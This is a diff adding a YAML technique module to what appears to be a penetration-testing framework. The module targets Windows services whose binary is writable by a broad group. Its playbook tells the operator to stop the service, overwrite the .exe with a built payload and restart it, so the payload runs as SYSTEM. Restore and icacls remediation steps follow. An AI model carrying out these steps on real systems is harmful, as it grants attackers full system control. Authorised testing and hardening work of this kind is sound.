@@ -1,0 +1,59 @@
+# Writable service binary → SYSTEM
+#
+# The service's on-disk binary ACL grants write to a broad principal.
+# The operator overwrites the .exe with an attacker payload, restarts
+# the service, and SCM runs the payload as the service account (SYSTEM).
+# Overwriting a *running* .exe is file-locked, so this is prepared:
+# fieldkit builds the payload; the operator stops the service, swaps
+# the binary, and starts it. Ported from privesc._d_win_writable_service.
+#
+# Emits ONE vector PER service in facts.writable_service_bins via
+# per-item iteration.
+technique: T1574.011
+name: writable service binary ({{name}}) → SYSTEM
+tactic: [privilege-escalation]
+platform: [windows]
+key: 'writablesvc:{{name}}'
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  writable_service_bins: true      # value ignored — predicate iterates facts.writable_service_bins
+execute:
+  # Command is a placeholder — the actual overwrite + restart is
+  # operator-driven (see playbook). Placeholder mirrors the inlined
+  # driver's `(manual) overwrite {exe} with the built payload, restart {name}`.
+  command: '(manual) overwrite {{exe}} with the built payload, restart {{name}}'
+  builds:
+    - format: exe
+      as: '{{stage}}\svc_{{slug}}.exe'
+verify:
+  success: "NT AUTHORITY"
+cleanup:
+  command: ''
+report:
+  vector_type: writable_service_binary
+  evidence: "icacls {{exe}}: writable by a broad group"
+  description: >
+    The service binary ACL grants write access to a broad principal —
+    the operator replaces the .exe with an attacker payload and
+    restarts the service. SCM runs the new binary as the service
+    account (SYSTEM by default).
+  remediation: >
+    Restrict the ACL on the service .exe to SYSTEM + Administrators:
+    `icacls "C:\path\to\svc.exe" /inheritance:r /grant:r "SYSTEM:F"
+    "Administrators:F"`. Audit every service binary the same way.
+  refs: [T1574.011, writable-service-binary]
+playbook:
+  summary: >
+    Replace {{name}}'s writable binary ({{exe}}) with the built payload.
+    Prepare-only route — overwriting a running .exe is file-locked, so
+    the operator stops the service, swaps the file, and restarts.
+  place: '{{exe}}'
+  steps:
+    - 'back up the original: copy "{{exe}}" "{{exe}}.bak"'
+    - 'sc stop {{name}}'
+    - 'copy /Y {{stage}}\svc_{{slug}}.exe "{{exe}}"'
+    - 'sc start {{name}}   (it now runs the payload as SYSTEM)'
+  restore: 'sc stop {{name}} & copy /Y "{{exe}}.bak" "{{exe}}" & sc start {{name}} & del {{stage}}\svc_{{slug}}.exe "{{exe}}.bak"'
